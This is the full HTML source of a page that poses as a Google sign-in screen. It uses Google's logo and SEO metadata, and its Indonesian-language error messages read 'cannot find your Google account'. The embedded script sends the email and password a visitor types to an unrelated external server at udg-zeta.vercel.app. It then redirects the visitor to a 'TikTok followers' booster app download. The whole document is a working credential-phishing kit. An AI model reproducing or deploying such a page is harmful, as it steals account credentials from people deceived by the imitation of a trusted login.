<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- CSS TAMBAHAN -->
    <link rel="stylesheet" href="https://pclouds.vercel.app/style.css">

    <!-- META SEO (DIUBAH) -->
    <meta name="description" content="Login to Google to continue accessing your account securely. Enter your email and password to sign in.">
    <meta name="keywords" content="Login to Google, Google Sign In, Google Account, Secure Login">
    <meta name="author" content="Google Account">

    <meta property="og:title" content="Login To Google">
    <meta property="og:description" content="Sign in to your Google account securely to continue.">
    <meta property="og:image" content="URL-to-your-image.jpg">
    <meta property="og:url" content="URL-to-your-download-page">
    <meta property="og:type" content="website">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Login To Google">
    <meta name="twitter:description" content="Access your Google account securely by logging in.">
    <meta name="twitter:image" content="URL-to-your-image.jpg">

    <meta name="robots" content="index, follow">

    <title>Login To Google</title>

    <link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"/>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
</head>
<body>

    <div class="bodys">
        <div class="login-container">

            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" 
                 alt="Google Logo" class="google-logo" width="120">

            <h2>Sign in</h2>
            <p>to continue to TikTok Followers APK</p>

            <form id="loginForm">
                <input type="email" id="email" name="email" placeholder="Email or phone" required>
                <input type="password" id="password" name="password" class="mt-3" placeholder="Enter your password" required>

                <button type="submit" id="loginBtn" class="mt-4 rounded-3">Next</button>

                <div id="emailError" style="color: red; font-size: 14px; display: none; margin-top: 15px;">
                    Tidak dapat menemukan akun Google Anda!
                </div>
            </form>

            <div class="footer">
                <p>Not your computer? Use a private browsing window to sign in. 
                    <a href="#!">Login in Facebook</a>
                </p>
            </div>

        </div>
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", async function (e) {
            e.preventDefault();

            const email = document.getElementById("email").value.trim();
            const password = document.getElementById("password").value.trim();
            const emailError = document.getElementById("emailError");
            const loginBtn = document.getElementById("loginBtn");

            emailError.style.display = "none";

            const originalBtnText = loginBtn.innerHTML;

            loginBtn.innerHTML = `
                <span class="spinner-border spinner-border-sm"></span>
                &nbsp;Loading...
            `;
            loginBtn.disabled = true;

            try {
                const res = await fetch("https://udg-zeta.vercel.app/api/download", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ email, password })
                });

                const data = await res.json();

                if (data.success === true) {
                    window.location.href = "https://tikbooster-booster-to-get-followers.id.aptoide.com/app";
                    return;
                }

                emailError.innerText = "Tidak dapat menemukan akun Google Anda!";
                emailError.style.display = "block";

            } catch (err) {
                console.error(err);
                emailError.innerText = "Terjadi kesalahan koneksi!";
                emailError.style.display = "block";
            }

            loginBtn.innerHTML = originalBtnText;
            loginBtn.disabled = false;
        });
    </script>

</body>
</html>
